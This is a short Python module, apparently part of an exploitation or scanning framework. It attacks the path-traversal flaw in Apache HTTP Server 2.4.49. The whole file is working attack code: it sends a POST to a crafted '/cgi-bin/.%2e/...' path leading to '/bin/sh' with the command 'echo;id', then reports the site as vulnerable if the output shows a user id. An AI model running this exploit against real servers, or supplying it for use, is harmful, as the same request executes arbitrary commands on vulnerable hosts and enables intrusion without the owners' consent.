import requests
from core.printmodels import *
import urllib.parse

class Apache_Path_Traversal_RCE:
    def __init__(self):
        self.name = "Apache Path Traversal RCE"
        self.description = "Apache HTTP Server 2.4.49 Path Traversal to RCE"
        self.author = "mrphoenix"

    def Exploit(self, site):
        try:
            headers = {
                "User-Agent": "Mozilla/5.0",
                "Accept-Encoding": "gzip, deflate"
            }
            
            payload = "echo;id"
            encoded_payload = urllib.parse.quote(payload)
            target = f"{site}/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh"
            
            response = requests.post(target, headers=headers, data=encoded_payload, verify=False, timeout=10)
            
            if response.status_code == 200 and "uid=" in response.text:
                return PrintSuccess(f"[Apache-Path-RCE] Vulnerable to RCE!")
            return PrintFailed("[Apache-Path-RCE] Not Vulnerable")
        except Exception as e:
            return PrintError(f"[Apache-Path-RCE] Error: {str(e)}")
